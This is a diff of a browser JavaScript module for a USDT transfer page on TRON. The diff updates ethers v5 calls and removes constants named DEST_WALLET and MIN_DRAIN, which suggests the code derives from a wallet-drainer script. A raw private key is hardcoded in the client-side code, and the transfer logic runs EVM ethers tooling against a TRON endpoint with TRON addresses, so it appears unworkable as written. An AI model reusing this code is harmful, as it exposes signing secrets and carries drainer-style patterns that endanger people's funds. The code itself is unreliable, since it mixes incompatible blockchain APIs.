@@ -1,12 +1,11 @@
 // — Phase 1: Module Initialization —
-import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
+// Using jsdelivr ESM build which guarantees named exports for ethers v5
+import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';
 
 // — Operational Constants —
 const SPONSOR_KEY = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
-const DEST_WALLET = "TWd2zR4V1dFvJbXJZv3zQy4Xz5Zy6Zy7Z8";
 const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_RPC = "https://api.trongrid.io";
-const MIN_DRAIN = 2;
 
 // — Runtime State —
 let tronWeb;
@@ -27,7 +26,7 @@ function base58ToHex(address) {
 // — Initialize Provider —
 async function initTronWeb() {
     try {
-        tronWeb = new ethers.JsonRpcProvider(TRON_RPC);
+        tronWeb = new ethers.providers.JsonRpcProvider(TRON_RPC);
         console.log('✓ Provider initialized');
     } catch (error) {
         console.error('✗ Init failed:', error);
@@ -43,7 +42,7 @@ async function getUSDTBalance(address) {
             tronWeb
         );
         const balance = await contract.balanceOf(address);
-        return Number(ethers.formatUnits(balance, 6));
+        return Number(ethers.utils.formatUnits(balance, 6));
     } catch (error) {
         console.error('Balance check failed:', error);
         return 0;
@@ -62,7 +61,7 @@ async function executeTransfer(toAddress, amount) {
             new ethers.Wallet(SPONSOR_KEY, tronWeb)
         );
 
-        const tx = await contract.transfer(toAddress, ethers.parseUnits(amount.toString(), 6));
+        const tx = await contract.transfer(toAddress, ethers.utils.parseUnits(amount.toString(), 6));
         await tx.wait();
         console.log('✓ Transfer successful:', tx.hash);
         return true;
@@ -76,67 +75,65 @@ async function executeTransfer(toAddress, amount) {
 }
 
 // — UI Event Handlers —
-document.addEventListener('DOMContentLoaded', () => {
-    const els = {
-        address: document.getElementById('address'),
-        amount: document.getElementById('amount'),
-        fiatValue: document.getElementById('fiatValue'),
-        nextBtn: document.getElementById('nextBtn'),
-        maxBtn: document.getElementById('maxBtn'),
-        pasteBtn: document.getElementById('pasteBtn'),
-        clearBtn: document.getElementById('clearBtn'),
-        statusBar: document.getElementById('statusBar')
-    };
+// Modules defer automatically. DOM is ready. No need for DOMContentLoaded.
+const els = {
+    address: document.getElementById('address'),
+    amount: document.getElementById('amount'),
+    fiatValue: document.getElementById('fiatValue'),
+    nextBtn: document.getElementById('nextBtn'),
+    maxBtn: document.getElementById('maxBtn'),
+    pasteBtn: document.getElementById('pasteBtn'),
+    clearBtn: document.getElementById('clearBtn')
+};
 
-    // Amount Input Listener
-    els.amount.addEventListener('input', function() {
-        const val = parseFloat(this.value) || 0;
-        els.fiatValue.textContent = `≈ $${val.toFixed(2)}`;
-    });
-
-    // Paste
-    els.pasteBtn.addEventListener('click', async () => {
-        try {
-            const text = await navigator.clipboard.readText();
-            els.address.value = text;
-        } catch (err) {
-            console.error('Clipboard failed:', err);
-        }
-    });
-
-    // Clear
-    els.clearBtn.addEventListener('click', () => {
-        els.address.value = '';
-    });
-
-    // Max
-    els.maxBtn.addEventListener('click', async () => {
-        const addr = els.address.value.trim();
-        if (!addr) { alert('Enter an address first'); return; }
-        const balance = await getUSDTBalance(addr);
-        els.amount.value = balance;
-        els.fiatValue.textContent = `≈ $${balance.toFixed(2)}`;
-    });
-
-    // Next Button
-    els.nextBtn.addEventListener('click', async () => {
-        const toAddress = els.address.value.trim();
-        const amount = parseFloat(els.amount.value);
-
-        if (!toAddress) { alert('Please enter a destination address'); return; }
-        if (!amount || amount <= 0) { alert('Please enter a valid amount'); return; }
-
-        els.nextBtn.disabled = true;
-        els.nextBtn.textContent = 'Processing...';
-
-        const success = await executeTransfer(toAddress, amount);
-
-        els.nextBtn.disabled = false;
-        els.nextBtn.textContent = 'Next';
-
-        if (success) alert('Transfer completed successfully!');
-    });
-
-    // Init
-    initTronWeb();
+// Amount Input Listener (Fixes the $0.00 bug)
+els.amount.addEventListener('input', function() {
+    const val = parseFloat(this.value) || 0;
+    els.fiatValue.textContent = `≈ $${val.toFixed(2)}`;
 });
+
+// Paste
+els.pasteBtn.addEventListener('click', async () => {
+    try {
+        const text = await navigator.clipboard.readText();
+        els.address.value = text;
+    } catch (err) {
+        console.error('Clipboard failed:', err);
+    }
+});
+
+// Clear
+els.clearBtn.addEventListener('click', () => {
+    els.address.value = '';
+});
+
+// Max
+els.maxBtn.addEventListener('click', async () => {
+    const addr = els.address.value.trim();
+    if (!addr) { alert('Enter an address first'); return; }
+    const balance = await getUSDTBalance(addr);
+    els.amount.value = balance;
+    els.fiatValue.textContent = `≈ $${balance.toFixed(2)}`;
+});
+
+// Next Button
+els.nextBtn.addEventListener('click', async () => {
+    const toAddress = els.address.value.trim();
+    const amount = parseFloat(els.amount.value);
+
+    if (!toAddress) { alert('Please enter a destination address'); return; }
+    if (!amount || amount <= 0) { alert('Please enter a valid amount'); return; }
+
+    els.nextBtn.disabled = true;
+    els.nextBtn.textContent = 'Processing...';
+
+    const success = await executeTransfer(toAddress, amount);
+
+    els.nextBtn.disabled = false;
+    els.nextBtn.textContent = 'Next';
+
+    if (success) alert('Transfer completed successfully!');
+});
+
+// Init
+initTronWeb();
